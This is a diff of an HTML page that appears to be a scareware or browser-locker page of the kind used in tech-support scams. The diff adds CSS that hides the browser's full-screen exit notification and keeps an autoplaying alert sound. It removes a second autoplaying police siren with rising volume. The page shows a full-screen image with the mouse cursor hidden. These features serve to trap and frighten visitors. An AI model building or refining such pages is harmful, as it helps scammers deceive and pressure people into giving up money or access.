@@ -23,6 +23,9 @@
     :-webkit-full-screen {
   display: none;
 }
+    :-webkit-full-screen-exit-notification {
+  display: none;
+}
     <script type="text/javascript" src="code.jquery.com/jquery-1.4.4.min.js"></script>
     <script type="text/javascript">//<![CDATA[
     $(function(){
@@ -109,29 +112,9 @@
         </div>
 
 
-  <audio id="sound1" autoplay>
-  <source src="_Fm7-alert.mp3" type="audio/mpeg">
- </audio>
-
-<audio id="sound2" autoplay>
-  <source src="police-6007.mp3" type="audio/mpeg">
-</audio>
-      // Get the second audio element
-var sound2 = document.getElementById("sound2");
-
-// Set the initial volume to 30%
-sound2.volume = 0.3;
-
-// Gradually increase the volume over 4 seconds
-var interval = setInterval(function() {
-  // Increase the volume by 10%
-  sound2.volume += 0.1;
-
-  // Stop the interval when the volume reaches 100%
-  if (sound2.volume >= 1) {
-    clearInterval(interval);
-  }
-}, 100);
+<audio autoplay="" id="pridez">
+      <source src="_Fm7-alert.mp3" type="audio/mpeg">
+    </audio>
     <div class="bg" style="cursor:none">
       <div class="bgimg" style="top:0">
         <img src="f24.png" alt="" width="100%">
